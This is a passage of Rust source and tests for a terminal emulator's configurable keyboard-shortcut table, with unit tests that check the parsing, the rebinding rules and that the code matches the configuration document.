        // by contrasting the document against the source. **The symbol has no language**, so it survives the
        // milestone: what is withdrawn is the Spanish name, not the drawing of the key.
        //
        // **And only the symbol: `up`, `down`, `left` and `right` are NOT here because they are not needed.** egui
        // calls these four keys `Up`, `Down`, `Left` and `Right`, so the fallback below already
        // resolves them by their name. Measured before removing them: without these four arms the whole suite stays
        // green, including the cases that test them. An alias that repeats what the fallback already does reads
        // as a decision and it is not one.
        "↑" => Some(Key::ArrowUp),
        "↓" => Some(Key::ArrowDown),
        "←" => Some(Key::ArrowLeft),
        "→" => Some(Key::ArrowRight),
        _ => None,
    };
    if alias.is_some() {
        return alias;
    }
    // **It searches among ALL ignoring case, and not by flipping the name around.** Capitalizing the
    // initial fixes `f4` but not `pageup`, which is really called `PageUp` with two. Iterating the
    // list is once per line of the file, not per frame.
    Key::ALL
        .iter()
        .copied()
        .find(|key| key.name().eq_ignore_ascii_case(name))
}

/// Which chord does each thing.
///
/// **It is the single source of which chord belongs to the application**, and that is the reason it exists. Before
/// they were **two parallel lists** —one said whether the chord was ours and the other what it did— and misaligning them already
/// left an arrow «in the queue never reaching the program», with its comment written in place. With
/// eleven configurable chords that risk multiplies by eleven.
///
/// **What it does NOT unify is each action's condition**: that creating does not count repeated, or that switching
/// tabs is only ours with more than one open, still hangs off the action that needs it. They are
/// real and have to survive the chord changing.
#[derive(Debug, Clone)]
pub struct Keymap {
    /// Chord → action pairs. **A vector and not a map**: they are eleven at most, and iterating eleven pairs of
    /// booleans and an integer is faster than reducing the chord to a number. It is looked up once per keyboard
    /// event, which is the project's hottest path.
    table: Vec<(Chord, Action)>,
}

impl Default for Keymap {
    /// The factory ones: the same usual thirteen minus paste, which does not arrive as a key.
    fn default() -> Self {
        use eframe::egui::Key;
        let with_the_chord = |key| Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key,
        };
        // **The scrollback goes with plain «Shift», and it is not a capricious exception.** Without it,
        // `PageUp` is the program's —a pager uses it— and taking it away would break `less` inside this
        // window.
        let scrollback = |key| Chord {
            ctrl: false,
            shift: true,
            alt: false,
            key,
        };
        Self {
            table: vec![
                (with_the_chord(Key::D), Action::SplitRight),
                (with_the_chord(Key::B), Action::SplitDown),
                (with_the_chord(Key::X), Action::ClosePane),
                (with_the_chord(Key::T), Action::NewTab),
                (with_the_chord(Key::W), Action::CloseTab),
                (with_the_chord(Key::ArrowLeft), Action::PreviousTab),
                (with_the_chord(Key::ArrowRight), Action::NextTab),
                (scrollback(Key::PageUp), Action::ScrollPageUp),
                (scrollback(Key::PageDown), Action::ScrollPageDown),
                (scrollback(Key::Home), Action::ScrollToTop),
                (scrollback(Key::End), Action::ScrollToBottom),
            ],
        }
    }
}

impl Keymap {
    /// Which action that chord does, if any.
    ///
    /// **A chord that is not in the table is NOT the application's**, and its bytes go down to the program
    /// inside. It is the half that makes unbinding a shortcut worth something.
    pub fn action_for(&self, chord: Chord) -> Option<Action> {
        self.table
            .iter()
            .find(|(chord_of, _)| *chord_of == chord)
            .map(|(_, action)| *action)
    }

    /// Changes an action's chord. `None` unbinds it.
    ///
    /// Returns the action left **without** its chord by the clash, if any: two actions cannot
    /// share a chord, because then pressing would not know which of the two to do.
    pub fn bind(&mut self, action: Action, chord: Option<Chord>) -> Option<Action> {
        self.table.retain(|(_, chord_of)| *chord_of != action);
        let chord = chord?;
        // **The last one read wins, and which one lost is said.** It is what makes pasting one set of shortcuts
        // on top of another do what is expected; keeping quiet would leave someone half an hour changing a line
        // that another further down is stepping on.
        let displaced = self
            .table
            .iter()
            .find(|(chord_of, _)| *chord_of == chord)
            .map(|(_, action)| *action);
        self.table.retain(|(chord_of, _)| *chord_of != chord);
        self.table.push((chord, action));
        displaced
    }
}

#[cfg(test)]
mod keymap_tests {
    use super::*;
    use eframe::egui::Key;

    #[test]
    fn the_document_publishes_exactly_the_shortcuts_the_code_has() {
        // **It is the highest-yielding reviewer in this project, written as a test.** Contrasting the published
        // document against the source found nine mismatches in a single PR, none visible in the diff.
        // Here it already caught two: the document promised «shift+prior», which the code rejected, and published the
        // arrows with their symbol, which it did not understand either.
        //
        // **The table below is copied from the document by hand and on purpose.** Generating it from the code would measure
        // that the code is consistent with itself; what has to be tied down is that what is published is true.
        let published = [
            ("split-right", "ctrl+shift+d", Action::SplitRight),
            ("split-down", "ctrl+shift+b", Action::SplitDown),
            ("close-pane", "ctrl+shift+x", Action::ClosePane),
            ("new-tab", "ctrl+shift+t", Action::NewTab),
            ("close-tab", "ctrl+shift+w", Action::CloseTab),
            ("previous-tab", "ctrl+shift+←", Action::PreviousTab),
            ("next-tab", "ctrl+shift+→", Action::NextTab),
            ("scroll-page-up", "shift+pageup", Action::ScrollPageUp),
            ("scroll-page-down", "shift+pagedown", Action::ScrollPageDown),
            ("scroll-to-top", "shift+home", Action::ScrollToTop),
            ("scroll-to-bottom", "shift+end", Action::ScrollToBottom),
        ];
        assert_eq!(
            published.len(),
            ALL.len(),
            "the document publishes {} shortcuts and the code has {}",
            published.len(),
            ALL.len()
        );

        let keymap = Keymap::default();
        for (name, written, action) in published {
            assert_eq!(
                Action::from_written(name),
                Some(action),
                "the document publishes the name «{name}» and the code does not understand it"
            );
            let chord = Chord::from_written(written).unwrap_or_else(|| {
                panic!("the document publishes «{written}» and the code does not understand it")
            });
            assert_eq!(
                keymap.action_for(chord),
                Some(action),
                "the document says «{name}» is «{written}» by default, and it is not"
            );
        }
    }

    #[test]
    fn the_eleven_factory_ones_are_the_same_as_always() {
        // **It is what makes this change break no one.** The factory chords are the ones the
        // terminal had before they could be configured, and a table born with others would
        // change them for everyone all at once without anyone asking.
        let keymap = Keymap::default();
        let with_the_chord = |key| Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key,
        };
        let scrollback = |key| Chord {
            ctrl: false,
            shift: true,
            alt: false,
            key,
        };

        let factory = [
            (with_the_chord(Key::D), Action::SplitRight),
            (with_the_chord(Key::B), Action::SplitDown),
            (with_the_chord(Key::X), Action::ClosePane),
            (with_the_chord(Key::T), Action::NewTab),
            (with_the_chord(Key::W), Action::CloseTab),
            (with_the_chord(Key::ArrowLeft), Action::PreviousTab),
            (with_the_chord(Key::ArrowRight), Action::NextTab),
            (scrollback(Key::PageUp), Action::ScrollPageUp),
            (scrollback(Key::PageDown), Action::ScrollPageDown),
            (scrollback(Key::Home), Action::ScrollToTop),
            (scrollback(Key::End), Action::ScrollToBottom),
        ];

        for (chord, expected) in factory {
            assert_eq!(
                keymap.action_for(chord),
                Some(expected),
                "the factory chord of «{}» changed",
                expected.as_written()
            );
        }
        // **Against the pairs just exercised, not against a number written separately.** A literal
        // here goes stale as soon as the list changes, and what has to be tied down is that **no action is
        // left without a factory chord**: a new action with no pair in the list above would never
        // fire and nothing would say so.
        assert_eq!(
            ALL.len(),
            factory.len(),
            "there are actions without a factory chord, or factory chords of actions that no longer exist"
        );
    }

    #[test]
    fn a_chord_that_no_one_claims_is_not_the_applications() {
        // **It is the half that makes unbinding a shortcut worth something**: what is not in the table goes down to the
        // program inside. Without it, `none` would leave the chord in a limbo where it neither does anything nor
        // reaches `vim`.
        let keymap = Keymap::default();
        assert_eq!(
            keymap.action_for(Chord {
                ctrl: true,
                shift: true,
                alt: false,
                key: Key::Z
            }),
            None,
            "a chord no one configured came out as the application's"
        );
    }

    #[test]
    fn unbinding_an_action_gives_the_chord_back_to_the_program() {
        let mut keymap = Keymap::default();
        let its_own = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::D,
        };
        assert_eq!(keymap.action_for(its_own), Some(Action::SplitRight));

        assert_eq!(
            keymap.bind(Action::SplitRight, None),
            None,
            "unbinding steps on no one"
        );
        assert_eq!(
            keymap.action_for(its_own),
            None,
            "the unbound chord is still the application's, so it does not reach the program"
        );
    }

    #[test]
    fn changing_a_chord_frees_the_old_one() {
        // **The two halves of the criterion**: the new one does its thing, and the old one stops doing it. Without the
        // second, reassigning would add chords instead of moving them.
        let mut keymap = Keymap::default();
        let old = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::D,
        };
        let new = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::E,
        };

        keymap.bind(Action::SplitRight, Some(new));

        assert_eq!(
            keymap.action_for(new),
            Some(Action::SplitRight),
            "the new chord does nothing"
        );
        assert_eq!(
            keymap.action_for(old),
            None,
            "the old chord still splits: reassigning added instead of moving, and the program never receives it"
        );
    }

    #[test]
    fn two_actions_do_not_keep_the_same_chord_and_which_one_loses_is_said() {
        // **The last one wins, and which one lost is said.** Keeping quiet would leave someone half an hour changing a
        // line that another further down is stepping on; and leaving both with the same chord would make pressing
        // not know which of the two to do.
        let mut keymap = Keymap::default();
        let of_closing = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::X,
        };

        let displaced = keymap.bind(Action::SplitRight, Some(of_closing));

        assert_eq!(
            displaced,
            Some(Action::ClosePane),
            "it did not say which action was left without a chord"
        );
        assert_eq!(
            keymap.action_for(of_closing),
            Some(Action::SplitRight),
            "the last one did not win"
        );
    }

    #[test]
    fn a_chord_is_written_the_way_people_write_it() {
        for text in [
            "ctrl+shift+e",
            "Ctrl+Shift+E",
            "SHIFT+ctrl+e",
            "  ctrl + shift + e  ",
        ] {
            assert_eq!(
                Chord::from_written(text),
                Some(Chord {
                    ctrl: true,
                    shift: true,
                    alt: false,
                    key: Key::E
                }),
                "«{text}» was not understood"
            );
        }
        // **And the modifier key is now written only in English.** D27 brings into the milestone what whoever uses the
        // terminal sees and decides to leave no alias table; without this assertion, a branch that kept admitting
        // the old spelling goes unnoticed and brings back through the back door the debt the decision
        // saved.
        for text in ["ctrl+mayusculas+e", "ctrl+mayúsculas+e", "ctrl+mayus+e"] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» is still accepted: there is an alias table where D27 says there is none"
            );
        }
    }

    #[test]
    fn the_keys_are_written_the_way_people_write_them() {
        // **`Key::from_name` is case-sensitive and whoever types a file is not.** Checked by running it:
        // `F4` yes and `f4` no, `PageUp` yes and `pageup` no. Without this, half the chords someone
        // would write by hand would be rejected without it being understood why.
        for (text, expected) in [
            ("ctrl+f4", Key::F4),
            ("ctrl+F4", Key::F4),
            ("shift+pageup", Key::PageUp),
            ("shift+home", Key::Home),
            ("ctrl+space", Key::Space),
            ("ctrl+delete", Key::Delete),
        ] {
            assert_eq!(
                Chord::from_written(text).map(|a| a.key),
                Some(expected),
                "«{text}» was not understood"
            );
        }

        // **And the aliases.** `prior` and `next` are what the traditional terminals call them — and what
        // this project's document called them before anyone checked they do not exist. The arrows
        // are also written with the arrow, which is how the document publishes them and it has no language.
        for (text, expected) in [
            ("shift+prior", Key::PageUp),
            ("shift+next", Key::PageDown),
            ("shift+pgup", Key::PageUp),
            ("shift+pgdn", Key::PageDown),
            ("ctrl+esc", Key::Escape),
            ("ctrl+left", Key::ArrowLeft),
            ("ctrl+up", Key::ArrowUp),
            // **The four arrows by their symbol, and the four because they are the only alias in this
            // `match` that the fallback CANNOT resolve**: egui calls them `Up`, `Down`, `Left` and
            // `Right`, so their names resolve on their own and the drawing does not. Two of them nothing
            // exercised while the document published them.
            ("ctrl+←", Key::ArrowLeft),
            ("ctrl+→", Key::ArrowRight),
            ("ctrl+↑", Key::ArrowUp),
            ("ctrl+↓", Key::ArrowDown),
        ] {
            assert_eq!(
                Chord::from_written(text).map(|a| a.key),
                Some(expected),
                "«{text}» was not understood"
            );
        }

        // **And the Spanish key names are no longer valid**, for the same reason as the modifier key above:
        // without asserting it, half of an alias table that D27 forbids can survive without anything failing.
        for text in [
            "shift+repág",
            "ctrl+supr",
            "shift+inicio",
            "shift+fin",
            "ctrl+izquierda",
            "ctrl+espacio",
        ] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» is still accepted: there is an alias table where D27 says there is none"
            );
        }
    }

    #[test]
    fn the_copy_and_paste_chords_cannot_be_claimed() {
        // **Accepting them would be promising something that does not happen**: the desktop resolves them before they
        // arrive, so those chords never appear as keys. Whoever wrote them would see a shortcut
        // that does nothing and would have no way to know why.
        for text in [
            "ctrl+shift+v",
            "ctrl+v",
            "ctrl+alt+v",
            "ctrl+shift+c",
            "ctrl+c",
            "ctrl+alt+c",
        ] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» was accepted, and it would never arrive"
            );
        }
        // But without Ctrl they are keys like any other.
        for text in ["shift+v", "shift+c", "alt+c"] {
            assert!(
                Chord::from_written(text).is_some(),
                "«{text}» was rejected, and that one does arrive"
            );
        }
    }

    #[test]
    fn a_chord_without_a_modifier_key_is_not_allowed() {
        // **Allowing it would let whoever configures take a letter away from typing** without anything
        // warning them: `key.copy = c` would make the `c` never reach the program.
        for text in ["c", "e", "prior"] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» was accepted as a chord, and it would take that key down with it"
            );
        }
        // And what is no known key either.
        for text in ["ctrl+shift+", "ctrl+shift+noexiste", "ctrl+shift+e+f", ""] {
            assert_eq!(Chord::from_written(text), None, "«{text}» was accepted");
        }
    }

    #[test]
    fn the_actions_are_written_the_way_the_document_publishes_them() {
        for action in ALL {
            let written = action.as_written();
            assert_eq!(Action::from_written(written), Some(action));
        }
        assert_eq!(
            Action::from_written("paste"),
            None,
            "paste is not a reassignable shortcut"
        );
        assert_eq!(Action::from_written("made-up"), None);

        // **And the old names are no longer valid**, which is the half D27 decides and nothing else tied down: without this,
        // leaving the old list beside the new one no test notices.
        for old in [
            "partir-al-lado",
            "cerrar-division",
            "pestaña-nueva",
            "pestana-nueva",
        ] {
            assert_eq!(
                Action::from_written(old),
                None,
                "«{old}» is still accepted: there is an alias table where D27 says there is none"
            );
        }
    }

    /// **The eleven names live twice**: here and in the configuration document, written by hand
    /// in both places. Nothing compared them, so renaming one left a
    /// configuration file published with a key the application rejects — and no test noticed.
    ///
    /// The document is read at compile time instead of repeating the list: a test that
    /// copied the eleven names fixes itself when someone translates them on both sides and
    /// forgets the document, which is exactly the failure it comes to catch.
    ///
    /// **And it is the other direction of [`the_document_publishes_exactly_the_shortcuts_the_code_has`],
    /// not a duplicate of it.** That one copies the document's table by hand **on purpose** —its
    /// comment says so— and with that catches **the code** deviating from what is published. But being a copy,
    /// a change in the document without touching the code leaves it green: measured. This one reads the document
    /// for real, so it catches that half. Both are needed, and that is why neither is redundant.
    /// **The eleven names live twice**: here and in the configuration document, written by hand
    /// in both places. Nothing compared them, so renaming one left a
    /// configuration file published with a key the application rejects — and no test noticed.
    ///
    /// The document is read at compile time instead of repeating the list: a test that
    /// copied the eleven names fixes itself when someone translates them on both sides and
    /// forgets the document, which is exactly the failure it comes to catch.
    ///
    /// **And it is the other direction of [`the_document_publishes_exactly_the_shortcuts_the_code_has`],
    /// not a duplicate of it.** That one copies the document's table by hand **on purpose** —its
    /// comment says so— and with that catches **the code** deviating from what is published. But being a copy,
    /// a change in the document without touching the code leaves it green: measured. This one reads the document
    /// for real, so it catches that half. Both are needed, and that is why neither is redundant.
    /// **Each chord the document publishes is really interpreted.**
    ///
    /// It is the gap that remained between the other two guards: those tie down the eleven **names** and the key
    /// table, and leave out the prose —the key spellings, the list of modifier keys and the
    /// «By default» column—, which is where this project's historical mismatch came from: the document promised
    /// `shift+prior` and the code rejected it, and no one saw it until a person contrasted the two
    /// files by hand. That chord is one of the fourteen this test walks.
    ///
    /// **A chord is recognized by its shape and not by where it is**, so this guard anchors on no
    /// phrase. That is what carried it through the delivery that translated this document: three of
    /// its sibling guards hooked on Spanish headings and column names, and all three came back red
    /// the day the document turned English. This one did not notice, which is the point.
    #[test]
    fn each_chord_the_document_publishes_the_code_understands() {
        const DOCUMENT: &str = include_str!("../../../docs/08-configuracion.md");

        // **The example blocks are removed before splitting on the backticks**, and not for
        // fun: their fences are three backticks, so splitting over the whole document
        // returns the block's body as if it were a token. The examples already have their own guard,
        // that passes them through the file's parser.
        let mut inside = false;
        let prose: String = DOCUMENT
            .lines()
            .filter(|line| {
                if line.starts_with("```") {
                    inside = !inside;
                    return false;
                }
                !inside
            })
            .collect::<Vec<_>>()
            .join("\n");
        let published: Vec<&str> = prose
            .split('`')
            .skip(1)
            .step_by(2)
            // A chord is a `+` **between two parts**, and that shape is what distinguishes it from the plain `+`
            // with which the document explains how one is written.
            .filter(|token| token.contains('+') && token.split('+').all(|part| !part.is_empty()))
            // **And the case distinguishes the two things the document writes with `+`.** What is in
            // lowercase is a line of the file —the examples and the «By default» column—; what carries a
            // capital names **the key that is pressed** (`Ctrl+Shift+C`), which is prose and not
            // syntax. The two the document declares impossible to assign fall in the second group,
            // and that they are rejected is already asserted by [`the_copy_and_paste_chords_cannot_be_claimed`].
            .filter(|token| **token == token.to_lowercase())
            .collect();
        // Without a floor, a document that stopped writing chords in backticks would leave this
        // test passing by being empty. Today it publishes fourteen.
        assert_eq!(
            published.len(),
            14,
            "the document publishes {} chords in lowercase: either it changed shape, or this walk stopped \
             finding them and the test is not looking at anything — {published:?}",
            published.len()
        );

        for chord in published {
            assert!(
                Chord::from_written(chord).is_some(),
                "the document publishes the chord «{chord}» and the code rejects it: whoever copies it \
                 would write a line that does nothing"
            );
        }
    }

    #[test]
    fn each_action_is_published_in_the_configuration_document() {
        const DOCUMENT: &str = include_str!("../../../docs/08-configuracion.md");

        let unpublished: Vec<&str> = ALL
            .iter()
            .map(|action| action.as_written())
            .filter(|name| !DOCUMENT.contains(&format!("`{name}`")))
            .collect();

        assert!(
            unpublished.is_empty(),
            "these actions can be configured and the document does not publish them: {unpublished:?}. \
             Whoever reads the document would not know they exist, and whoever follows it would write a key that \
             the application rejects"
        );
    }

    /// **The shortcut table is read out of the document, row by row, and confronted with the code.**
    ///
    /// It is the half the other three leave open, and both of its directions were measured green
    /// before it was written:
    ///
    /// - [`the_document_publishes_exactly_the_shortcuts_the_code_has`] copies the table **by hand and
    ///   on purpose**, so its `published.len() == ALL.len()` counts the copy in this file and never
    ///   the document. Adding a twelfth row — `zoom-pane`, a name the code does not have — left the
    ///   whole suite green.
    /// - [`each_action_is_published_in_the_configuration_document`] goes the other way, code to
    ///   document, so a name the document invents is nothing to it.
    /// - [`each_chord_the_document_publishes_the_code_understands`] asks only whether a chord
    ///   **parses**, never which action it belongs to. Changing the «Out of the box» cell of
    ///   `split-right` from `ctrl+shift+d` to `ctrl+shift+g` also left the suite green, and that cell
    ///   is the one somebody reads to find out what their terminal does today.
    ///
    /// **The names and the chords are paired by position inside the row**, because two of the rows
    /// carry two of each — `previous-tab` · `next-tab` — and pairing them any other way would be
    /// asserting on a set instead of on the mapping, which is the whole thing being published.
    #[test]
    fn the_document_publishes_the_shortcut_table_the_code_really_has() {
        const DOCUMENT: &str = include_str!("../../../docs/08-configuracion.md");

        // Every backticked token of a cell, in the order the cell writes them.
        fn backticked(cell: &str) -> Vec<&str> {
            cell.split('`').skip(1).step_by(2).collect()
        }

        let mut published: Vec<(&str, &str)> = Vec::new();
        let rows = DOCUMENT
            .lines()
            .skip_while(|line| !line.starts_with("| Name | What it does | Out of the box |"))
            .skip(2)
            .take_while(|line| line.starts_with('|'));
        for row in rows {
            let cells: Vec<&str> = row.split('|').collect();
            let names = backticked(cells.get(1).unwrap_or(&""));
            let chords = backticked(cells.get(3).unwrap_or(&""));
            assert_eq!(
                names.len(),
                chords.len(),
                "the row «{row}» publishes {} names and {} chords: whoever reads it cannot tell which \
                 chord is which shortcut's",
                names.len(),
                chords.len()
            );
            published.extend(names.into_iter().zip(chords));
        }

        // **The floor is an equality against the code and not a count written here**, which is what
        // makes this the guard the hand copy cannot be: a row invented in the document fails it, and
        // so does a shortcut the code grows and the table does not.
        assert_eq!(
            published.len(),
            ALL.len(),
            "the document's shortcut table publishes {} shortcuts and the code has {}: either the \
             document names one the application does not, or this walk stopped finding the table — \
             {published:?}",
            published.len(),
            ALL.len()
        );

        let keymap = Keymap::default();
        for (name, written) in published {
            let action = Action::from_written(name).unwrap_or_else(|| {
                panic!(
                    "the document publishes the shortcut «{name}» and the code does not understand \
                     it: whoever follows the document writes «key.{name} = …» and the terminal \
                     ignores the line"
                )
            });
            let chord = Chord::from_written(written).unwrap_or_else(|| {
                panic!("the document publishes «{written}» for «{name}» and the code rejects it")
            });
            assert_eq!(
                keymap.action_for(chord),
                Some(action),
                "the document says «{name}» comes as «{written}» out of the box, and pressing that \
                 chord does {:?}",
                keymap.action_for(chord)
            );
        }
    }
}
